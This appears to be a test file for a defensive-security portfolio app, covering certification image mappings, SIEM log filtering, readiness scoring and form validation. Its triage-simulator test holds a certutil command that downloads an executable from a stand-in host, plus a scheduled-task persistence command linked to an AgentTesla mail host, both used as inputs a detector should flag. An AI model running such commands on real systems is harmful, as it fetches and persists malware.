import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  filterProjects,
  filterSiemLogs,
  calculateDefensiveReadiness,
  evaluateTelemetryPayload,
  validateNewProjectInput,
  validateContactDispatch,
} from './portfolioLogic.ts';
import {
  INITIAL_PROJECTS,
  TELEMETRY_SOURCES,
  INITIAL_CERTIFICATIONS,
  CYBER_RANGES,
  LIVE_SIEM_LOGS,
} from '../data/blueTeamData.ts';

describe('Blue Team Portfolio Logic & Verified Certification Mapping', () => {
  it('ensures all 8 official certifications have direct visual previewImageUrl with zero mismatches', () => {
    assert.equal(INITIAL_CERTIFICATIONS.length, 8);

    const byId = Object.fromEntries(
      INITIAL_CERTIFICATIONS.map((c) => [c.id, c])
    );

    assert.equal(
      byId['comptia-csap'].previewImageUrl,
      '/assets/aistudio/cert_comptia_csap.png'
    );
    assert.equal(
      byId['comptia-cysa-plus'].previewImageUrl,
      '/assets/aistudio/cert_comptia_cysa.png'
    );
    assert.equal(
      byId['comptia-sec-plus'].previewImageUrl,
      '/assets/aistudio/cert_comptia_secplus.png'
    );
    assert.equal(
      byId['stellar-cyber-xdr'].previewImageUrl,
      '/assets/aistudio/Screenshot_2026-10-25_at_7.21.26_PM_1930ab4a.png'
    );
    assert.equal(
      byId['letsdefend-soc-path'].previewImageUrl,
      '/assets/aistudio/8b01fde1-6f39-408b-aafe-d0e8d006faef_d8bc23e9.png'
    );
    assert.equal(
      byId['cisco-ethical-hacker'].previewImageUrl,
      '/assets/aistudio/Screenshot_2026-10-25_at_7.15.58_PM_0731e82c.png'
    );
    assert.equal(
      byId['google-cybersecurity'].previewImageUrl,
      '/assets/aistudio/Screenshot_2026-10-25_at_7.15.08_PM_987b9787.png'
    );
    assert.equal(
      byId['isc2-cc-domain5'].previewImageUrl,
      '/assets/aistudio/cert_isc2_domain5.svg'
    );
  });

  it('ensures Cyber Ranges point to the exact verified progress screenshots', () => {
    const byId = Object.fromEntries(CYBER_RANGES.map((r) => [r.id, r]));
    assert.equal(
      byId['letsdefend'].proofImageUrl,
      '/assets/aistudio/Screenshot_2026-10-25_at_7.13.21_PM_e883bb20.png'
    );
    assert.equal(
      byId['stellar-cyber'].proofImageUrl,
      '/assets/aistudio/Screenshot_2026-10-25_at_7.21.26_PM_1930ab4a.png'
    );
    assert.equal(
      byId['portswigger'].proofImageUrl,
      '/assets/aistudio/Screenshot_2026-10-25_at_7.18.33_PM_82b2bca6.png'
    );
  });

  it('filters live SIEM logs by severity and search query', () => {
    const allLogs = filterSiemLogs(LIVE_SIEM_LOGS, 'ALL', '');
    assert.equal(allLogs.length, LIVE_SIEM_LOGS.length);

    const criticalOnly = filterSiemLogs(LIVE_SIEM_LOGS, 'CRITICAL', '');
    assert.ok(criticalOnly.length >= 2);
    assert.ok(criticalOnly.every((l) => l.severity === 'CRITICAL'));

    const agentTeslaLogs = filterSiemLogs(LIVE_SIEM_LOGS, 'ALL', 'AgentTesla');
    assert.equal(agentTeslaLogs.length, 1);
    assert.equal(agentTeslaLogs[0].source, 'ANY.RUN-SANDBOX');
  });

  it('filters projects by category and search keyword', () => {
    const siemProjects = filterProjects(INITIAL_PROJECTS, 'SIEM & Detection', '');
    assert.equal(siemProjects.length, 3);

    const queryResult = filterProjects(INITIAL_PROJECTS, 'All', 'AgentTesla');
    assert.equal(queryResult.length, 1);
    assert.equal(queryResult[0].id, 'agenttesla-malware-dynamic-analysis');
  });

  it('calculates defensive readiness coverage and MTTD accurately', () => {
    const full = calculateDefensiveReadiness(
      TELEMETRY_SOURCES,
      TELEMETRY_SOURCES.map((s) => s.id)
    );
    assert.equal(full.coverageScore, 100);
    assert.equal(full.readinessTier, 'Autonomous SOC Grade');
    assert.equal(full.estimatedMttdMinutes, 3.5);
  });

  it('evaluates live telemetry payloads in the Triage Simulator', () => {
    const certutilRes = evaluateTelemetryPayload(
      'certutil.exe -urlcache -split -f http://evil.sh/a.exe'
    );
    assert.equal(certutilRes.verdict, 'MALICIOUS');
    assert.ok(certutilRes.riskScore >= 90);

    const agentTeslaRes = evaluateTelemetryPayload(
      'schtasks.exe /Create /TN "Updates\\YWWxWhs" && smtp.godforeu.com'
    );
    assert.equal(agentTeslaRes.verdict, 'MALICIOUS');
    assert.equal(agentTeslaRes.riskScore, 98);

    const benignRes = evaluateTelemetryPayload('ipconfig /all');
    assert.equal(benignRes.verdict, 'BENIGN');
  });

  it('validates new project and contact form submissions', () => {
    const badProj = validateNewProjectInput({
      title: 'ab',
      category: 'SIEM & Detection',
      timeline: '2026',
      environment: 'Lab',
      mitreTechniqueIds: 'T1105',
      summary: 'short',
      impactMetric: 'no',
      toolsUsed: '',
    });
    assert.equal(badProj.valid, false);

    const goodContact = validateContactDispatch({
      senderName: 'Alex Mercer',
      senderEmail: 'alex@soc-enterprise.io',
      organization: 'Global SOC',
      inquiryType: 'SOC Analyst',
      message: 'We would love to schedule a technical interview this week.',
    });
    assert.equal(goodContact.valid, true);
  });
});
